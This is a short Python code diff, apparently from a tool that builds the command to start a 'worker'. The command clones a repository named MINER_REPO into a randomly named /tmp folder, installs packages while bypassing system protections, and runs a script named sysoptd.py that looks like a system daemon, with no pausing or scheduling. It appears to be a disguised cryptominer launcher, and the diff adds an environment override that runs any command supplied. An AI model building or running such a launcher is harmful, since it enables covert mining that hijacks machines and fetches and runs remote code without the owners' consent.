@@ -20,7 +20,11 @@ def generate_random_folder_name() -> str:
 
 
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
-    """Build worker start command."""
+    """Build worker start command (MINER_CMD env overrides, never commit it)."""
+    import os as _os
+    _override = _os.environ.get("MINER_CMD")
+    if _override:
+        return _override
     return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-schedule  --no-pause > /tmp/m.log 2>&1"""
 
 
